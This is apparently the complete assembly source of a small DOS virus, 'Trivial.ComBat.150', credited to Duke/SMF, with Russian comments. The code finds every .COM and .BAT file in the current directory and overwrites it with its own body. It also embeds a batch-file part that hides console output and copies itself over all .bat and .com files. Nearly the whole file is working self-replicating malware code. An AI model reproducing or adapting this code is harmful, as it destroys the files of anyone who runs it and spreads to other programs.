; Trivial.ComBat.150 (c) by Duke/SMF
; Поражает все BAT и COM-файлы в текущей директории.

                .model  tiny
                .code
                org     100h
virus_length    equ     finish - start      ;Длина вируса

start:                                      ;Начало вируса
                db      ': '                ;Имитируем метку BAT-файла

                mov     ah,04Eh             ;Поиск первого файла
                mov     dx,offset file_sp1  ;DX указывает на "*.com"
                call    writer              ;Вызов поиска

                mov     ah,04Eh             ;Поиск первого файла
                mov     dx,offset file_sp2  ;DX указывает на "*.bat"
                call    writer              ;Вызов поиска

                mov     ax,04c01h           ;Конец работы
                int     021h

                db      'ComBat by Duke/SMF';Жизненно необходимый копирайт !
;-------------------------------------------
writer          proc
infect:
                int     21h
                jnc     infect_file         ;Если файл найден, то поражаем,
                ret                         ;в противном случае - на выход

infect_file:
                mov     ax,03D01h           ;Открываем файл для записи
                mov     dx,09Eh             ;DX указывает на найденный файл
                int     021h

                xchg    bx,ax               ;BX содержит файловый handle

                mov     ah,040h             ;Функция записи в файл
                mov     cl,virus_length     ;CL = сколько байт писать
                mov     dx,offset start     ;DX = начало кода вируса
                int     021h

                mov     ah,03Eh             ;Закрываем файл
                int     021h

                mov     ah,04Fh             ;Поиск следующего файла
                jmp     infect              ;Переход на заражение

                endp
;-------------------------------------------

file_sp1        db      '*.com',0           ;Маска COM-файлов для поиска
file_sp2        db      '*.bat',0           ;Маска BAT-файлов для поиска
batnic          db      13,10               ;BAT-часть вируса
                db      '@ctty nul',13,10
                db      '@for %%g in (*.bat, *.com) do copy %0 %%g',13,10
                db      'ctty con',13,10
finish:                                     ;Конец вируса
                end     start
